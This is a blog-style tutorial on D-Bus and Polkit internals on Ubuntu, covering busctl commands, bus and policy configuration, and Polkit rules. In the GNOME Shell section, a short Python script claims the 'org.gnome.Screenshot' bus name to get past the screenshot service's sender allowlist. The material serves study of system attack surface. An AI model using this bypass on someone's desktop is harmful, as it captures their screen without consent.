---
layout: post
title:  "DBus and Polkit Introduction"
categories: linux
---

Inspired by [@4ttil4sz1a's post](https://ssd-disclosure.com/ssd-advisory-linux-kernel-hfsplus-slab-out-of-bounds-write/) on the SSD-disclosure blog, I spent some time understanding how D-Bus and Polkit work on Ubuntu and other Unix-based Linux distributions, with the goal of exploring more kernel attack surfaces.

In this post, I will introduce the internals of D-Bus and Polkit, and then use two CVEs as examples to illustrate the types of vulnerabilities that can occur and their impacts. Finally, I'll share two small tricks that leverage D-Bus mechanisms to perform some interesting (though not very practical, haha) operations. At the end, I've also included a cheatsheet for some tools, which I hope will be helpful when experimenting with them. 🙂

The research was done on Ubuntu 24.04, with the following output from the `uname -a` command:

```
Linux DBUS-VM 6.11.0-26-generic #26~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr 17 19:20:47 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

## 1. D-Bus (Desktop Bus)

Desktop Bus, also known as **"D-Bus,"** is a hybrid IPC (Inter-process Communication) and RPC (Remote Procedure Call) mechanism used in Unix-based Distributions such as Ubuntu and Red Hat Linux. This mechanism is implemented by creating dbus daemons, and these daemons create unix sockets to receive requests. Processes can register their services on the bus with a unique bus name, and other processes can send requests to the services by specifying a bus name.

D-Bus has two types: the **system bus** and the **session bus**. There is only **one system bus**, and the services registered on it are typically used to configure **system-wide** settings, such as updating the hostname or creating a user.

Unlike the system bus, a session bus is created for each logged-in user. It is **user-dependent** — one user cannot access another user's session bus. This also implies that the session bus is used to configure the local environment or use features that only affect the corresponding user.

The Unix socket for the system bus is located at **`/run/dbus/system_bus_socket`**, while the session bus can be found at **`/run/user/<uid>/bus`**. Although you can connect directly to the unix socket and interact with dbus, it is generally more practical to use tools to send requests. Common command-line tools include `busctl`, `gdbus`, and `dbus-send`. If you want to write your own tool, the libraries `libdbus` (for C) and `pydbus` (for Python) are good choices.

For GUI, the tool **`d-feet`** is very useful, and here is the interface of `d-feet`:

<img src="/assets/image-20250522190853750.png" alt="image-20250522190853750" style="display: block; margin-left: auto; margin-right: auto; zoom:50%;" />


### 1.1. Registration

When a process registers a service on the bus, the bus daemon assigns it a **unique bus name**. This name typically looks like `:1.123` and is guaranteed to be **unique**, as bus names are never reused. In addition to this unique bus name, a process can also assign a more human-readable name to the service, known as an **alias name** or a **well-known name**. These names usually follow a dotted format, such as `org.freedesktop.DBus`.

In fact, the architecture of a dbus service is similar to a tree. A process can register multiple **object paths** under its bus name — for example, `/org/freedesktop/DBus`. Under each object path, the process can register one or more **interfaces** (e.g., `org.freedesktop.DBus`), and within each interface, it can define **methods** (e.g., `GetConnectionUnixProcessID`). Of course, a method has its own **argument signature**, which describes the types and number of arguments it expects. The signature format can be somewhat complex, so it is recommended to refer to the [documentation on signature strings](https://pythonhosted.org/txdbus/dbus_overview.html) for details.

In short, the components of a dbus service are as follows:
- **Bus name**: e.g., `org.freedesktop.DBus` (well-known) or `:1.100` (unique)
- **Object path**: e.g., `/org/freedesktop/DBus`
- **Interface**: e.g., `org.freedesktop.DBus`
- **Method**: e.g., `GetConnectionUnixProcessID`
- **Signature**: e.g., `s` (a single string argument)

### 1.2. busctl 101

I prefer using the **`busctl` tool** to communicate with dbus services. It allows you to query object paths, interfaces, and methods associated with a given bus name. In addition, users can choose to communicate with either the system bus or the session bus by specifying the `--system` or `--user` option, respectively.

For example, to retrieve the **object paths** under the bus name `org.freedesktop.DBus`, you can use the **`tree`** command with `busctl`:

``` bash
#                                         [bus name]
dbus-test@DBUS-VM:~$ busctl --system tree org.freedesktop.DBus
└─ /org/freedesktop/DBus
```

Next, you can use the **`introspect`** command to **list interfaces, methods, and method signatures** under the object path `/org/freedesktop/DBus`:

``` bash
#                                               [bus name]           [object path]
dbus-test@DBUS-VM:~$ busctl --system introspect org.freedesktop.DBus /org/freedesktop/DBus
NAME                                  TYPE      SIGNATURE RESULT/VALUE                             FLAGS
org.freedesktop.DBus                  interface -         -                                        -
.AddMatch                             method    s         -                                        -
.GetAdtAuditSessionData               method    s         ay                                       -
...
```

Finally, you can use the **`call`** command to invoke a **method** with the required parameters:

``` bash
#                                         [bus name]           [object path]         [interface]          [method]                   [signature]
dbus-test@DBUS-VM:~$ busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus GetConnectionUnixProcessID s ":1.123"
Call failed: Could not get PID of name ':1.123': no such name
```

### 1.3. Bus Information

After learning how to use `busctl`, we can begin calling built-in methods of the dbus daemon to retrieve information about the bus and its services. One such method is **`ListNames`**, which returns a list of **currently-owned bus names** on the system or session bus. This method is particularly useful when we want to determine how many services are currently registered on the bus.

In my environment, there are 76 bus names on the system bus. However, since a service can have both a unique name and one or more alias names, this number only indicates that at most 76 services are active.

``` bash
dbus-test@DBUS-VM:~$ busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus ListNames
as 76 "org.freedesktop.DBus" ":1.7" "org.freedesktop.timesync1" ":1.8" ":1.9" "org.freedesktop.systemd1" "org.freedesktop.ModemManager1" "org.freedesktop.NetworkManager" "org.freedesktop.oom1" "net.hadess.PowerProfiles" "org.freedesktop.resolve1" "org.freedesktop.RealtimeKit1" "org.freedesktop.Accounts" ":1.60" ":1.61" ":1.62" ":1.40" ":1.63" ":1.41" ":1.86" "org.freedesktop.PolicyKit1" ":1.20" ":1.21" ":1.66" ":1.22" ...
```

On the session bus, the number of bus names is lower. In this case, only 13 names are present:

``` bash
dbus-test@DBUS-VM:~$ busctl --user call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus ListNames
as 13 "org.freedesktop.DBus" ":1.7" ":1.9" "org.freedesktop.systemd1" ":1.10" "org.freedesktop.impl.portal.PermissionStore" ":1.11" ":1.12" "org.pulseaudio.Server" ":1.3" ":1.4" ":1.5" "org.freedesktop.portal.Documents"
```

### 1.4. Introspection

In general, an object path implements the **interface `org.freedesktop.DBus.Introspectable`**, which provides the **method `Introspect`**. This method returns **XML-formatted** data that describes the **interfaces, methods, and properties** available under that object path.

``` bash
dbus-test@DBUS-VM:~$ echo -e `busctl --system call org.opensuse.CupsPkHelper.Mechanism / org.freedesktop.DBus.Introspectable Introspect`
 ...
 <interface name=\"org.opensuse.CupsPkHelper.Mechanism\">
 <method name=\"FileGet\">
 <annotation name=\"org.freedesktop.DBus.GLib.Async\" value=\"\"/>
 <arg type=\"s\" name=\"resource\" direction=\"in\"/>
 <arg type=\"s\" name=\"filename\" direction=\"in\"/>
 <arg type=\"s\" name=\"error\" direction=\"out\"/>
 </method>
 <method name=\"FilePut\">
 <annotation name=\"org.freedesktop.DBus.GLib.Async\" value=\"\"/>
 <arg type=\"s\" name=\"resource\" direction=\"in\"/>
 <arg type=\"s\" name=\"filename\" direction=\"in\"/>
 <arg type=\"s\" name=\"error\" direction=\"out\"/>
 </method>
 ...
```

The definition of the introspection interface and its methods can be **automatically generated by the build system**. For example, the `meson.build` file of package [cups-pk-helper](https://www.freedesktop.org/wiki/Software/cups-pk-helper/) uses the `gdbus_codegen()` function provided by the GNOME module:

```
...
cph_iface_mechanism_source = gnome.gdbus_codegen (
  'cph-iface-mechanism',
  'cups-pk-helper-mechanism.xml',
  interface_prefix : 'org.opensuse.CupsPkHelper.',
  namespace : 'CphIface',
  object_manager : true
)
...
```

According to the [Meson documentation](https://mesonbuild.com/Gnome-module.html#gnomegdbus_codegen), the given XML file is compiled into gdbus source code using `gdbus_codegen()`. This process automatically defines and includes the introspection interface and its methods in the generated code.

### 1.5. Properties

An interface may have **certain properties** used for internal purposes or to indicate its current status. A property can be either read-only or writable, depending on how the interface defines it.

To retrieve a property's value, you can use the **`get-property`** command of `busctl`:

``` bash
dbus-test@DBUS-VM:~$ busctl --system get-property org.freedesktop.oom1 /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogLevel
s "info"
```

To update a property's value, you can use the **`set-property`** command of `busctl`:

``` bash
dbus-test@DBUS-VM:~$ busctl --system set-property org.freedesktop.oom1 /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogLevel s "AA"
Failed to set property LogLevel on interface org.freedesktop.LogControl1: Access denied
```

### 1.6. Method Argument

The XML files located at `/usr/share/dbus-1/interfaces/` describe method and interface details, including **argument descriptions**. They appear similar to the XML files provided by packages, although I am not certain of their origin.

For example, the content of the file `com.canonical.UbuntuAdvantage.xml` is as follows:

```
...
<node name="/">
  ...
  <interface name='com.canonical.UbuntuAdvantage.Service'>
    <method name='Enable'/>
    <method name='Disable'/>
    <property name='Name' type='s' access='read'/>
    <property name='Description' type='s' access='read'/>
    <property name='Entitled' type='s' access='read'/>
    <property name='Status' type='s' access='read'/>
  </interface>
</node>
```

### 1.7. Lazy Loading

When the dbus daemon receives a request, it identifies the target process based on the associated bus name and forwards the request accordingly. However, if the bus name is registered but **the corresponding process no longer exists**, the daemon reads the service configuration file to determine which binary is responsible for that bus name, and then **launches the binary**.

For the session bus, service configuration files are typically located in:
- `/usr/share/dbus-1/services/`

For the system bus, the configuration files can be found in:
- `/usr/share/dbus-1/system-services/`

Interestingly, `systemd` also exposes methods under the bus name `org.freedesktop.systemd1`. This is why you can find configuration files with the `dbus-org` prefix in the `/usr/lib/systemd/system/` directory.

``` bash
dbus-test@DBUS-VM:~$ ls -al /usr/lib/systemd/system/dbus-org.freedesktop.*
lrwxrwxrwx 1 root root 25 Oct 18  2024 /usr/lib/systemd/system/dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root 23 Oct 18  2024 /usr/lib/systemd/system/dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root 22 Oct 18  2024 /usr/lib/systemd/system/dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root 25 Oct 18  2024 /usr/lib/systemd/system/dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
```

### 1.8. System Bus Daemon

The binary used by both the system bus daemon and the session bus daemon is located at `/usr/bin/dbus-daemon`. For more information, please refer [the official documentation](https://dbus.freedesktop.org/doc/dbus-daemon.1.html).

The system bus daemon is automatically invoked **at power-on** and runs under the `messagebus` user. It is launched with the following command line:

``` bash
@dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
```
- `--system`: Indicates that this is a system bus and implicitly uses the configuration file located at `/usr/share/dbus-1/system.conf`.
- `--address=systemd:`: Specifies that the bus address is managed by `systemd`, which actually uses the unix socket at `/run/dbus/system_bus_socket`.

The configuration file `/usr/share/dbus-1/system.conf` is an XML file that defines how the bus daemon operates. Below is a snippet from the file. We will highlight some commonly used elements and briefly explain their purposes:

```
...

  <policy context="default">
    <!-- All users can connect to system bus -->
    <allow user="*"/>

    <!-- Holes must be punched in service configuration files for
         name ownership and sending method calls -->
    <deny own="*"/>
    <deny send_type="method_call"/>

    <!-- Signals and reply messages (method returns, errors) are allowed
         by default -->
    <allow send_type="signal"/>
    <allow send_requested_reply="true" send_type="method_return"/>
    <allow send_requested_reply="true" send_type="error"/>

    <!-- All messages may be received by default -->
    <allow receive_type="method_call"/>
    <allow receive_type="method_return"/>
    <allow receive_type="error"/>
    <allow receive_type="signal"/>

    <!-- Allow anyone to talk to the message bus -->
    <allow send_destination="org.freedesktop.DBus"
           send_interface="org.freedesktop.DBus" />
    <allow send_destination="org.freedesktop.DBus"
           send_interface="org.freedesktop.DBus.Introspectable"/>
    <allow send_destination="org.freedesktop.DBus"
           send_interface="org.freedesktop.DBus.Properties"/>
    <allow send_destination="org.freedesktop.DBus"
           send_interface="org.freedesktop.DBus.Containers1"/>

...

  <includedir>system.d</includedir>

  <includedir>/etc/dbus-1/system.d</includedir>

...
```
- `<policy>`: Defines a **security policy** that applies to a specific set of connections to the bus.
- `<deny>`: Specifies actions that are explicitly prohibited. If a message matches a `<deny>` rule, the **action is blocked**.
- `<allow>`: Grants **exceptions** to previously defined `<deny>` rules, permitting specific actions.
- `<includedir>`: Includes all configuration files from the specified directory. This makes the overall configuration more modular and extensible.

More specific rules for individual services are defined in the configuration files located in `/usr/share/dbus-1/system.d`, which is one of the directories specified by the `<includedir>` element. Let's examine one such file: `avahi-dbus.conf`.

```
...
  <!-- Only root or user avahi can own the Avahi service -->
  <policy user="avahi">
    <allow own="org.freedesktop.Avahi"/>
  </policy>
  <policy user="root">
    <allow own="org.freedesktop.Avahi"/>
  </policy>

  <!-- Allow anyone to invoke methods on Avahi server, except SetHostName -->
  <policy context="default">
    <allow send_destination="org.freedesktop.Avahi"/>
    <allow receive_sender="org.freedesktop.Avahi"/>

    <deny send_destination="org.freedesktop.Avahi"
          send_interface="org.freedesktop.Avahi.Server" send_member="SetHostName"/>
  </policy>

  <!-- Allow everything, including access to SetHostName to users of the group "netdev" -->
  <policy group="netdev">
    <allow send_destination="org.freedesktop.Avahi"/>
    <allow receive_sender="org.freedesktop.Avahi"/>
  </policy>
  <policy user="root">
    <allow send_destination="org.freedesktop.Avahi"/>
    <allow receive_sender="org.freedesktop.Avahi"/>
  </policy>
...
```

This configuration file can be divided into three parts for analysis:
1. **Part One:** Ensures that only the users `avahi` and `root` are allowed to own the Avahi service.
2. **Part Two:** By default, any user can send messages to and receive messages from the Avahi service, but the `SetHostName` method is explicitly denied.
3. **Part Three:** Users in the `netdev` group and the `root` user are granted unrestricted access, including the ability to use `SetHostName`.

### 1.9. Session Bus Daemon

The session bus daemon is created **when a user logs in**, either remotely (via SSH or RDP) or locally. It is launched with the following command line:

``` bash
/usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
```
- `--session`: Indicates that this is a session bus and implicitly uses the configuration file located at `/usr/share/dbus-1/session.conf`.
- `--address=systemd:`: Specifies that the bus address is managed by `systemd`, which actually uses the unix socket at `/run/user/<uid>/bus`.

In `/usr/share/dbus-1/session.conf`, we can find several elements that do not appear in the system bus configuration:

```
...

  <listen>unix:tmpdir=/tmp</listen>

  <!-- On Unix systems, the most secure authentication mechanism is
  EXTERNAL, which uses credential-passing over Unix sockets.

  This authentication mechanism is not available on Windows,
  is not suitable for use with the tcp: or nonce-tcp: transports,
  and will not work on obscure flavours of Unix that do not have
  a supported credentials-passing mechanism. On those platforms/transports,
  comment out the <auth> element to allow fallback to DBUS_COOKIE_SHA1. -->
  <auth>EXTERNAL</auth>

  <standard_session_servicedirs />

  <policy context="default">
    <!-- Allow everything to be sent -->
    <allow send_destination="*" eavesdrop="true"/>
    <!-- Allow everything to be received -->
    <allow eavesdrop="true"/>
    <!-- Allow anyone to own anything -->
    <allow own="*"/>
  </policy>

  <!-- Include legacy configuration location -->
  <include ignore_missing="yes">/etc/dbus-1/session.conf</include>

  <!-- Config files are placed here that among other things,
       further restrict the above policy for specific services. -->
  <includedir>session.d</includedir>

  <includedir>/etc/dbus-1/session.d</includedir>

  <!-- This is included last so local configuration can override what's
       in this standard file -->
  <include ignore_missing="yes">/etc/dbus-1/session-local.conf</include>

  <include if_selinux_enabled="yes" selinux_root_relative="yes">contexts/dbus_contexts</include>

...
```
- `<listen>`: Specifies an address that the bus should listen on. However, if `dbus-daemon` is launched with `--address=systemd:`, that takes precedence.
- `<auth>`: Defines the permitted authentication mechanisms.
- `<standard_session_servicedirs/>`: Requests the use of standard session service directories. One such directory is `/run/user/1000/dbus-1/services`.

The `EXTERNAL` authentication method works by **checking the UID of the connecting process**, which is passed over the unix socket. The bus daemon then retrieves the credentials associated with that UID and verifies whether the user has sufficient permissions. For more details, please refer [the official documentation](https://dbus.freedesktop.org/doc/dbus-specification.html).

Below is an example from the documentation showing the authentication process for a client owned by a user with UID 1000:

```
31303030 is ASCII decimal "1000" represented in hex, so
the client is authenticating as Unix uid 1000 in this example.

C: AUTH EXTERNAL 31303030
S: OK 1234deadbeef
C: BEGIN
```

### 1.10. GNOME Shell

**GNOME Shell** is one of the most essential services for a workstation. It serves as the graphical shell of the GNOME desktop environment and is launched upon user login. The GNOME Shell binary, located at `/usr/bin/gnome-shell`, is responsible for **integrating the GUI with various system services**. During initialization, it also registers several bus names on the session bus.

``` bash
dbus-test@DBUS-VM:~$ busctl --user | grep gnome-shell
:1.34                                        2142 gnome-shell     dbus-test :1.34         user@1000.service -       -
:1.35                                        2142 gnome-shell     dbus-test :1.35         user@1000.service -       -
:1.63                                        2224 gnome-shell-cal dbus-test :1.63         user@1000.service -       -
com.canonical.Unity                          2142 gnome-shell     dbus-test :1.34         user@1000.service -       -
com.rastersoft.dingextension                 2142 gnome-shell     dbus-test :1.34         user@1000.service -       -
org.gnome.Mutter.DisplayConfig               2142 gnome-shell     dbus-test :1.34         user@1000.service -       -
org.gnome.Mutter.IdleMonitor                 2142 gnome-shell     dbus-test :1.34         user@1000.service -       -
...
```

Unlike other bus services, interacting with GNOME Shell is not quite straightforward. Let's take a look at the source code to understand how it works.

<br>

In `main()`, GNOME Shell calls `gjs_context_eval_module_file()` to execute a JavaScript file, `init.js` [1]. This function is part of [GJS (GNOME JavaScript)](https://github.com/GNOME/gjs/tree/master), the **JavaScript runtime engine** used by GNOME applications.

``` c
// main.c
int
main (int argc, char **argv)
{
  // [...]
  if (!gjs_context_eval_module_file (gjs_context,
                                    "resource:///org/gnome/shell/ui/init.js", // [1]
                                    &status,
                                    &error))
  // [...]
}
```

The `init.js` script then loads `main.js` [2], which starts the main loop.

``` js
// js/ui/init.js
// [...]
imports._promiseNative.setMainLoopHook(() => {
    // Queue starting the shell
    GLib.idle_add(GLib.PRIORITY_DEFAULT, () => {
        import('./main.js').then(main => main.start()).catch(e => { // [2]
            // [...]
        });
        return GLib.SOURCE_REMOVE;
    });

    // Run the meta context's main loop
    global.context.run_main_loop();
});
// [...]
```

The `start()` function not only sets up the user interface but also registers several dbus services. In this section, we focus on the bus service created by the **`GnomeShell` class** [3].

``` js
// js/ui/main.js
export async function start() {
    // [...]
    shellAccessDialogDBusService = new AccessDialog.AccessDialogDBus();
    shellAudioSelectionDBusService = new AudioDeviceSelection.AudioDeviceSelectionDBus();
    shellDBusService = new ShellDBus.GnomeShell(); // [3]
    shellMountOpDBusService = new ShellMountOperation.GnomeShellMountOpHandler();
    // [...]
}
```

The constructor of the `GnomeShell` class initializes two bus services: the extension service [4] and the **screenshot service** [5]. Here, we analyze how the screenshot service works.

``` js
// js/ui/shellDBus.js
export class GnomeShell {
    constructor() {
        // [...]
        this._extensionsService = new GnomeShellExtensions(); // [4]
        this._screenshotService = new Screenshot.ScreenshotService(); // [5]
        // [...]
    }
}
```

The constructor of the `ScreenshotService` class exports the object path `/org/gnome/Shell/Screenshot` [6] and initializes a `DBusSenderChecker` object [7].

``` js
// js/ui/screenshot.js
export class ScreenshotService {
    constructor() {
        // [...]
        this._dbusImpl.export(Gio.DBus.session, '/org/gnome/Shell/Screenshot'); // [6]

        this._screenShooter = new Map();
        this._senderChecker = new DBusSenderChecker([ // [7]
            'org.gnome.SettingsDaemon.MediaKeys',
            'org.freedesktop.impl.portal.desktop.gtk',
            'org.freedesktop.impl.portal.desktop.gnome',
            'org.gnome.Screenshot',
        ]);
        // [...]
    }
}
```

The `DBusSenderChecker` object verifies whether the sender is allowed to request a screenshot. Its constructor creates a map called `_allowlistMap` [8] to track **the current owners of methods** listed in the `allowList` [9].

``` js
// js/misc/util.js
export class DBusSenderChecker {
    // [...]
    constructor(allowList) {
        this._allowlistMap = new Map(); // [8]
        
        // [...]
        this._watchList = allowList.map(name => {
            return Gio.DBus.watch_name(Gio.BusType.SESSION,  // [9]
                name,
                Gio.BusNameWatcherFlags.NONE,
                (conn_, name_, owner) => {
                    this._allowlistMap.set(name, owner);
                    this._checkAndResolveInitialized(name);
                },
                () => {
                    this._allowlistMap.delete(name);
                    this._checkAndResolveInitialized(name);
                });
        });
    }
}
```

When a screenshot request is received, the `ScreenshotAsync()` function is called, which invokes `_createScreenshot()` [10] to generate the screenshot. Before returning the screenshot object, it calls `checkInvocation()` [11] to verify the sender.

``` js
// js/ui/screenshot.js
export class ScreenshotService {
    async _createScreenshot(invocation, needsDisk = true, restrictCallers = true) {
        // [...]
        else if (restrictCallers) {
            try {
                await this._senderChecker.checkInvocation(invocation); // [11]
            } catch (e) {
                invocation.return_gerror(e);
                return null;
            }
        }

        let shooter = new Shell.Screenshot();
        // [...]
        return shooter;
    }
    async ScreenshotAsync(params, invocation) {
        let [includeCursor, flash, filename] = params;
        let screenshot = await this._createScreenshot(invocation); // [10]
        if (!screenshot)
            return;
        // [...]
    }
}
```

The `checkInvocation()` function calls `_isSenderAllowed()` to determine whether the sender is in the `_allowlistMap` [12]. If the sender is not in the map, the request is immediately rejected [13].

``` js
// js/misc/util.js
export class DBusSenderChecker {
    async _isSenderAllowed(sender) {
        await this._initializedPromise;
        return [...this._allowlistMap.values()].includes(sender); // [12]
    }

    async checkInvocation(invocation) {
        // [...]
        if (await this._isSenderAllowed(invocation.get_sender()))
            return;

        throw new GLib.Error(Gio.DBusError,
            Gio.DBusError.ACCESS_DENIED,
            `${invocation.get_method_name()} is not allowed`); // [13]
    }
}
```

As a result, if you call the screenshot method directly, the request will be rejected because **the sender process is not included in the `_allowlistMap`**.

``` bash
dbus-test@DBUS-VM:~$ busctl --user call com.canonical.Unity /org/gnome/Shell/Screenshot org.gnome.Shell.Screenshot Screenshot bbs true true /tmp/aaa.png
Call failed: Access denied
```

To make the request succeed, you must first become the method owner of `org.gnome.Screenshot` using **the `RequestName` method**. This action updates the `_allowlistMap`, allowing the sender to pass verification. Finally, you should release ownership of the `org.gnome.Screenshot` name before exiting.

Below is a Python script that performs the required steps:

``` python
from pydbus import SessionBus
from gi.repository import GLib

bus = SessionBus()

# Request ownership of the 'org.gnome.Screenshot' name
bus.get("org.freedesktop.DBus", "/org/freedesktop/DBus").RequestName("org.gnome.Screenshot", 4)

# Call the screenshot method
bus.get("com.canonical.Unity", "/org/gnome/Shell/Screenshot").Screenshot(True, True, "/tmp/aaa.png")

# Release the ownership of the name
bus.get("org.freedesktop.DBus", "/org/freedesktop/DBus").ReleaseName("org.gnome.Screenshot")
```

## 2. Polkit (Policy Kit)

### 2.1. Overview

Services on the system bus may provide methods to modify global settings. Before performing such actions, it is essential to verify **whether the sender has the necessary permissions**. The bus name **`org.freedesktop.PolicyKit1`**, exported by the `polkitd` daemon, is responsible for **handling authorization**.

``` bash
dbus-test@DBUS-VM:~$ cat /usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service
[D-BUS Service]
Name=org.freedesktop.PolicyKit1
Exec=/usr/lib/polkit-1/polkitd --no-debug
User=root
SystemdService=polkit.service
```

The **"SYSTEM ARCHITECTURE"** section of [the official documentation](https://polkit.pages.freedesktop.org/polkit/polkit.8.html) provides a high-level overview of how Polkit works. In this architecture, privileged programs are referred to as **Mechanisms**, while unprivileged programs are called **Subjects**.

<img src="/assets/image-20250524162543172.png" alt="image-20250524162543172" style="display: block; margin-left: auto; margin-right: auto; zoom:50%;" />

When a Mechanism receives a request from a Subject, it calls methods on the **`org.freedesktop.PolicyKit1`** interface to check permissions. The `polkitd` daemon evaluates these permissions based on predefined **rules** and **actions** provided by services. If user authentication is required, `polkitd` indirectly invokes an authentication agent through a helper binary.

This helper binary (`/usr/lib/polkit-1/polkit-agent-helper-1`) is a **setuid root program** that uses the PAM API to prompt the user for credentials and perform the authentication. Once the credentials are verified, `polkitd` receives the result from the agent and informs the Mechanism of the authorization outcome.

### 2.2. Policy

**Policy files** are located in `/usr/share/polkit-1/actions/*.policy` and are written in **XML format**. Let's take `org.freedesktop.UDisks2.policy` as an example:

```
  <action id="org.freedesktop.udisks2.filesystem-mount">
    ...
    <defaults>
      <allow_any>auth_admin</allow_any>
      <allow_inactive>auth_admin</allow_inactive>
      <allow_active>yes</allow_active>
    </defaults>
  </action>
```
- `<action>`: Defines a **specific action** that can be authorized, identified by its unique id.
- `<defaults>`: Specifies the default authorization behavior under **different session conditions**:
    - `<allow_any>`: Applies to users accessing the system **remotely** (e.g., via SSH or RDP).
    - `<allow_inactive>`: Applies to **local** users whose session is currently **inactive**.
    - `<allow_active>`: Applies to **local** users with an **active** session.

The `<allow_*>` elements can contain one of the following values, which determine the required level of authorization:
- `no` – The action is not authorized.
- `yes` – The action is authorized **without requiring authentication**.
- `auth_self` – Requires authentication from the user who owns the session from which the request originates.
- `auth_admin` – Requires authentication from an administrative (privileged) user.
- `auth_self_keep` – Same as `auth_self`, but the authorization is cached for a short period, allowing repeated actions without re-authentication.
- `auth_admin_keep` – Same as `auth_admin`, but the authorization is cached for a short period.

In addition, an element called `<annotate>` represents a **key/value pair** used to attach metadata to an action. When the key is `org.freedesktop.policykit.imply`, it defines **implied authorizations**. This means that if a subject is authorized for an action containing this annotation, they are also **implicitly authorized for any actions listed in the annotation's value**.

For example, in `org.gnome.controlcenter.user-accounts.policy`, if a user is authorized for the action `org.gnome.controlcenter.user-accounts.administration`, they are also granted access to the following actions without additional authorization:

```
  <action id="org.gnome.controlcenter.user-accounts.administration">
    ...
    <annotate key="org.freedesktop.policykit.imply">org.freedesktop.accounts.user-administration org.freedesktop.realmd.configure-realm org.freedesktop.realmd.login-policy org.freedesktop.MalcontentControl.administration com.endlessm.ParentalControls.AppFilter.ReadAny com.endlessm.ParentalControls.AppFilter.ChangeAny com.endlessm.ParentalControls.AppFilter.ReadOwn com.endlessm.ParentalControls.AppFilter.ChangeOwn</annotate>
  </action>
```

To list all available PolicyKit actions on the system, you can use the `pkaction` tool without any options. Internally, it calls the `EnumerateActions` method over `polkitd` and formats the results:

``` bash
dbus-test@DBUS-VM:~$ pkaction
com.canonical.UbuntuAdvantage.attach
com.canonical.UbuntuAdvantage.detach
...
```

If you want to view detailed policy information for a specific action, use the **`-v` (verbose)** flag along with the `--action-id` option:

``` bash
dbus-test@DBUS-VM:~$ pkaction -v --action-id org.freedesktop.udisks2.loop-setup
org.freedesktop.udisks2.loop-setup:
  description:       Manage loop devices
  message:           Authentication is required to set up a loop device
  vendor:            The Udisks Project
  vendor_url:        https://github.com/storaged-project/udisks
  icon:              drive-removable-media
  implicit any:      auth_admin
  implicit inactive: auth_admin
  implicit active:   yes
```

However, mapping a dbus method to its corresponding action policy is not straightforward. The `.policy` file names **do not follow a strict naming convention**, so you cannot reliably infer the action name or file from the method name alone.

Furthermore, whether an application uses PolicyKit at all depends entirely on how the application is implemented. As a result, the only reliable way to determine if an application uses action policy (and which actions it invokes) is by **reviewing its source code**.

For example, when `udisksd` handles the `LoopSetup` method on the inteface `org.freedesktop.UDisks2.Manager`, it internally calls the `handle_loop_setup()` function. Within this function, a call is made to `polkitd` to check authorization for the action **`org.freedesktop.udisks2.loop-setup`** [1]:

``` c
// src/udiskslinuxmanager.c
static gboolean
handle_loop_setup (UDisksManager          *object,
                   GDBusMethodInvocation  *invocation,
                   GUnixFDList            *fd_list,
                   GVariant               *fd_index,
                   GVariant               *options)
{
  // [...]
  if (!udisks_daemon_util_check_authorization_sync (manager->daemon,
                                                    NULL,
                                                    "org.freedesktop.udisks2.loop-setup", // [1] hardcode action-id
                                                    options,
                                                    N_("Authentication is required to set up a loop device"),
                                                    invocation))
    goto out;
  // [...]
}
```

### 2.3. Rule

A **rule** determines whether a **subject** is authorized to perform a specific action. These rules are defined in files located under `/usr/share/polkit-1/rules.d/*.rules`, and interestingly, they are written in a **JavaScript-like syntax**.

Let's take the rule file `20-gnome-initial-setup.rules` as an example. This file first calls `polkit.addRule()` to register a callback function. The callback takes two parameters: `action` (the action being requested) and `subject` (the process requesting the action).

The callback function is where the authorization logic resides. In this case:
1. It first checks whether the subject is the `gnome-initial-setup` user [1].
2. If so, and if the action ID matches a predefined list (e.g., it starts with `org.freedesktop.hostname1.`), the rule then checks whether the request comes from a local session [2].
    - If the request is **local**, the action is allowed without further authentication (`'yes'`).
    - If the request is **remote**, administrative authentication is required (`'auth_admin'`).

``` js
polkit.addRule(function(action, subject) {
    if (subject.user !== 'gnome-initial-setup') // [1]
        return undefined;

    var actionMatches = (action.id.indexOf('org.freedesktop.hostname1.') === 0 ||
                         // [...]
                         action.id.indexOf('org.fedoraproject.thirdparty.') === 0);

    if (actionMatches) {
        if (subject.local) // [2]
            return 'yes';
        else
            return 'auth_admin';
    }

    return undefined;
});
```

Because rules provide more fine-grained control over authorization (e.g., allowing specific subjects to perform actions under certain conditions), they **take precedence over** policies.

### 2.4. Example - PowerOff

In this section, we use the **PowerOff** action as an example to illustrate the differences between authorization levels.

According to the action definition in `/usr/share/polkit-1/actions/org.freedesktop.login1.policy`, the method `PowerOff` on the dbus interface `org.freedesktop.login1.Manager` requires authentication when called from a remote session [1]. In contrast, a local and active session is allowed to power off the system without authentication [2].

```
...
        <action id="org.freedesktop.login1.power-off">
                <description gettext-domain="systemd">Power off the system</description>
                <message gettext-domain="systemd">Authentication is required to power off the system.</message>
                <defaults>
                        <allow_any>auth_admin_keep</allow_any>  ----------- [1]
                        <allow_inactive>auth_admin_keep</allow_inactive>
                        <allow_active>yes</allow_active>  ------------- [2]
                </defaults>
                <annotate key="org.freedesktop.policykit.imply">org.freedesktop.login1.set-wall-message</annotate>
        </action>
...
```

As a result, if you attempt to invoke the method from an SSH session (i.e., a remote session), it will fail and display an authentication requirement prompt:

``` bash
dbus-test@DBUS-VM:~$ busctl --system call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager PowerOff b 1
Call failed: Interactive authentication required.
```

However, if you invoke the same method from a local active session, it will succeed and the machine will power off immediately — without prompting for authentication!

### 2.5. Authentication Agent

We know that some actions require the subject to be authorized, but... **how does the authentication process actually work?**

The `pkcheck` tool is used to determine whether a specific process — identified by either `--process` or `--system-bus-name` — is authorized to perform a given action. If the action requires authentication and the `--allow-user-interaction` option is provided, `pkcheck` will trigger the authentication flow by invoking the agent helper (e.g., to prompt for a password).

